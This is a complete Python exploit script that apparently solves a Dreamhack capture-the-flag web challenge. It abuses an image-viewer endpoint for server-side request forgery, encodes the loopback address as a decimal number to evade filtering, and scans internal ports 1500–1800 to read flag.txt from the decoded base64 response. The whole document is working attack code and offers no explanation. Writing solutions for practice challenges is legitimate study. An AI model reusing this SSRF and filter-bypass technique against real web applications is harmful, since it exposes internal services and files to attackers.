import re
import base64
import requests

URL = "http://host8.dreamhack.games:12274/img_viewer"
ERROR_B64_PREFIX = "iVBORw0KGgoAAAANSUhEUgAAA04AAAF4CAYAAABjHKkYAAAMRmlDQ1BJQ0MgUHJvZmlsZQAASImV"

for port in range(1500, 1801):
    target = f"http://2130706433:{port}/flag.txt"
    res = requests.post(URL, data={"url": target})

    if "base64," not in res.text:
        continue

    b64 = res.text.split("base64,", 1)[1].split('"', 1)[0].replace("\n", "").replace(" ", "")

    if b64.startswith(ERROR_B64_PREFIX):
        continue

    raw = base64.b64decode(b64)
    text = raw.decode("utf-8", errors="ignore")

    m = re.search(r"DH\{[^}\r\n]*\}", text)
    if m:
        print("[+] Flag:", m.group(0))
    break
